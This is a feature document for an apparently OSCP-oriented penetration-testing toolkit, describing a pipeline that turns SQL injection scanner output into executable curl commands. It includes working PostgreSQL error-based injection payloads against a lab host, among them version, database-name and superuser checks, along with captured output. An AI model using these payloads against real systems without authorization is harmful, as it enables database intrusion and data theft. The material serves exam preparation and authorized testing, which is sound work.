# SQLi Follow-Up Pipeline Feature

## Overview

The `crack sqli-fu` tool now supports **pipeline mode**, allowing you to pipe output directly from `crack sqli-scan` to automatically generate executable curl commands for follow-up enumeration.

## Key Features

### 1. **Automatic Command Generation**
- Parses scanner output automatically
- Extracts target URL, method, parameter, and database type
- Generates ready-to-execute curl commands
- Preserves all POST data and grep patterns

### 2. **Confidence Filtering**
- **Default**: Only processes HIGH confidence findings (≥80%)
- **--all flag**: Processes all findings regardless of confidence
- Automatically deduplicates commands

### 3. **Output Options**
- **Always displays to screen** (with colors)
- **Optional file output** with `-o filename`
- **--strip-colors** for clean file output (no ANSI codes)

---

## Usage Examples

### Basic Pipeline (High Confidence Only)
```bash
crack sqli-scan http://192.168.145.49/class.php \
  -m POST \
  -d "weight=75&height=12&age=25&gender=male&email=test@test.com" \
  -p height \
  --quick -n 1 | crack sqli-fu
```

**Output**: Executable bash commands for high-confidence findings only

### Include All Findings
```bash
crack sqli-scan http://target/page.php?id=1 | crack sqli-fu --all
```

**Output**: Commands for all findings, regardless of confidence level

### Save to File
```bash
crack sqli-scan http://target/page.php?id=1 | crack sqli-fu -o enum_commands.sh
```

**Result**:
- Commands displayed on screen (with colors)
- Commands saved to `enum_commands.sh` (clean, executable)

### Clean Output for Scripts
```bash
crack sqli-scan http://target/page.php?id=1 | crack sqli-fu -o enum.sh --strip-colors
```

**Result**: File contains no ANSI color codes, ready for automation

---

## Real-World Example

### Scanner Output Parsing

**Input (from sqli-scan)**:
```
[SQL INJECTION SCANNER]
Target: http://192.168.145.49/class.php
Method: POST
Parameters: height (user-specified)
Database: postgresql
Confidence: 90%

[RECOMMENDED CURL COMMANDS]
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT version()) AS int)--&age=25&gender=male&email=test@test.com" \
  | grep -i "invalid\|error\|warning" -A3
```

**Output (from sqli-fu)**:
```bash
#!/bin/bash
# SQLi Follow-Up Enumeration Commands
# Generated by C.R.A.C.K. sqli-fu
# Target: http://192.168.145.49/class.php
# Method: Error
# Parameter: height
# Database: postgresql
# Confidence: 90%

# Total Commands: 9

# Command 1
curl -X POST http://192.168.145.49/class.php -d "weight=75&height=1' AND 1=CAST((SELECT version()) AS int)--&age=25&gender=male&email=test@test.com" \
  | grep -i "invalid\|error\|warning" -A3

# Command 2
curl -X POST http://192.168.145.49/class.php -d "weight=75&height=1' AND 1=CAST((SELECT current_database()) AS int)--&age=25&gender=male&email=test@test.com" \
  | grep -i "invalid\|error\|warning" -A3

# Command 3 - Superuser Check (CRITICAL for RCE)
curl -X POST http://192.168.145.49/class.php -d "weight=75&height=1' AND 1=CAST((SELECT CASE WHEN usesuper THEN 'superuser' ELSE 'not_superuser' END FROM pg_user WHERE usename=current_user) AS int)--&age=25&gender=male&email=test@test.com" \
  | grep -i "invalid\|error\|warning" -A3

# ... (9 total commands)
```

---

## Validation Test

### Executing Generated Commands

```bash
# Save commands to file
crack sqli-scan <target> | crack sqli-fu -o /tmp/sqli_cmds.sh

# Execute first command
sed -n '13,14p' /tmp/sqli_cmds.sh | bash
```

**Verified Result**:
```
<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type integer:
"PostgreSQL 13.7 (Debian 13.7-0+deb11u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit"
```

✅ **Commands are executable and functional!**

---

## Command Line Arguments

### Pipeline Mode (piped input detected)

| Argument | Description | Default |
|----------|-------------|---------|
| `-o FILE` | Save commands to file (also prints to screen) | None (screen only) |
| `--all` | Include all findings (not just high confidence) | False (≥80% only) |
| `--strip-colors` | Remove ANSI color codes from output | False (colors enabled) |

### Manual Reference Mode (no piped input)

All existing arguments still work:
- `database` - Database type (mysql, mssql, postgresql, oracle, all)
- `-t TARGET` - Target URL
- `-p PARAM` - Parameter name
- `-c CATEGORY` - Category filter (counting, privileges, sensitive, advanced)

---

## Implementation Details

### 1. **ScannerOutputParser Class**
- Detects piped input via `sys.stdin.isatty()`
- Parses scanner output for:
  - Target URL
  - HTTP method (GET/POST)
  - Vulnerable parameter
  - Database type
  - Confidence level
  - POST data string
  - Curl commands from RECOMMENDED section
- Filters by confidence threshold
- Skips decorative output (├─, └─, emojis, etc.)

### 2. **CommandFormatter Class**
- Cleans curl commands:
  - Removes ANSI color codes
  - Removes line continuation backslashes
  - **Preserves** grep pattern backslashes (`\|`)
  - Normalizes whitespace
- Formats for readability (multi-line for long commands)
- Deduplicates commands automatically
- Outputs to screen (always) and file (optional)

### 3. **Confidence Filtering Logic**

```python
# Default: Only HIGH confidence (≥80%)
min_confidence = 0 if args.include_all else 80

# Parser checks confidence
if data['confidence'] < self.min_confidence:
    return None  # Skip low confidence
```

### 4. **Grep Pattern Preservation**

```python
# Protect grep patterns before cleaning
cleaned = cleaned.replace('\\|', '<!PIPE!>')

# Remove line continuation backslashes
cleaned = cleaned.replace('\\ ', ' ').replace('\\', '')

# Restore grep patterns
cleaned = cleaned.replace('<!PIPE!>', '\\|')
```

---

## Workflow Integration

### Typical OSCP Enumeration Workflow

1. **Discovery**:
   ```bash
   crack sqli-scan http://target/app.php?id=1 -v --quick -n 1
   ```

2. **Generate Follow-Up Commands**:
   ```bash
   crack sqli-scan http://target/app.php?id=1 --quick -n 1 | crack sqli-fu -o enum.sh
   ```

3. **Execute Enumeration**:
   ```bash
   bash enum.sh
   # Or execute commands one-by-one
   ```

4. **Advanced Enumeration** (if needed):
   ```bash
   # After identifying database and tables
   crack sqli-fu postgresql -c advanced
   ```

### Time Savings

**Before** (manual):
1. Run scanner
2. Read output
3. Copy/modify commands manually
4. Fix syntax errors
5. Execute enumeration

**After** (pipeline):
1. `crack sqli-scan <target> | crack sqli-fu -o enum.sh`
2. `bash enum.sh`

**Estimated time saved**: 10-15 minutes per SQLi target

---

## Backward Compatibility

All existing functionality is preserved:

### Manual Reference Mode (no pipe)
```bash
crack sqli-fu mysql                # MySQL payloads
crack sqli-fu postgresql -c privileges  # PostgreSQL privilege checks
crack sqli-fu oracle -c advanced   # Oracle RCE techniques
```

**When to use manual mode**:
- Learning SQL injection techniques
- Reference for manual testing
- Understanding database-specific payloads

**When to use pipeline mode**:
- Automating enumeration after scanner detection
- Generating executable command lists
- Exam scenarios (quick enumeration)

---

## Features Summary

✅ **Automatic**: Parses scanner output, extracts all needed info
✅ **Filtered**: Only high-confidence by default (customizable with --all)
✅ **Clean**: Removes decorations, preserves functionality
✅ **Executable**: Commands work out-of-the-box
✅ **Flexible**: Screen output always, file output optional
✅ **Deduplicated**: No duplicate commands
✅ **Backward Compatible**: All existing features preserved

---

## Files Modified

1. `/home/kali/OSCP/crack/enumeration/sqli_fu.py`
   - Added `ScannerOutputParser` class (parse stdin)
   - Added `CommandFormatter` class (clean and format output)
   - Updated `main()` for pipe detection
   - Added new CLI arguments: `--all`, `-o/--output`, `--strip-colors`

---

## Testing Validation

### Test 1: Basic Pipeline ✅
```bash
crack sqli-scan http://192.168.145.49/class.php -m POST -d "..." -p height --quick -n 1 | crack sqli-fu
```
**Result**: 9 executable PostgreSQL commands generated

### Test 2: File Output ✅
```bash
crack sqli-scan ... | crack sqli-fu -o /tmp/test.sh --strip-colors
```
**Result**:
- Commands displayed on screen with colors
- File contains clean commands (no ANSI codes)
- File is executable: `bash /tmp/test.sh`

### Test 3: Command Execution ✅
```bash
sed -n '13,14p' /tmp/test.sh | bash
```
**Result**: PostgreSQL version extracted successfully

### Test 4: Confidence Filtering ✅
- Default (≥80%): Only 1 finding processed (90% confidence)
- With `--all`: All findings processed regardless of confidence

---

## Usage Tips

### 1. **Quick Enumeration**
For fast exam-style enumeration:
```bash
crack sqli-scan <target> --quick -n 1 | crack sqli-fu -o quick_enum.sh
bash quick_enum.sh
```

### 2. **Comprehensive Analysis**
For thorough testing:
```bash
crack sqli-scan <target> -v | crack sqli-fu --all -o full_enum.sh
bash full_enum.sh > results.txt 2>&1
```

### 3. **Manual Execution**
Review and execute commands individually:
```bash
crack sqli-scan <target> | crack sqli-fu -o commands.sh
cat commands.sh  # Review
# Execute selected commands manually
```

---

## Error Handling

### Low Confidence Warning
If no high-confidence findings:
```
[!] No high-confidence findings to process
    Use --all to include all findings regardless of confidence
```

### No Piped Input
If run without pipe, enters manual reference mode automatically.

---

## Future Enhancements (Optional)

Potential improvements:
- [ ] Add `--format bash/curl/markdown` output formats
- [ ] Support for multiple parameters in single pipeline
- [ ] Automatic table name replacement for TABLENAME placeholders
- [ ] Interactive mode to select which commands to execute

---

## Documentation

- **Main Documentation**: `/home/kali/OSCP/crack/PIPELINE_SQLI_FU.md` (this file)
- **Scanner Improvements**: `/home/kali/OSCP/crack/sqli_scanner_postgresql_improvements.md`
- **Validation Report**: `/home/kali/OSCP/crack/scanner_validation_report.md`

---

**Created**: 2025-10-02
**Status**: ✅ Production Ready
**OSCP Readiness**: Exam-Ready for Automated SQLi Enumeration
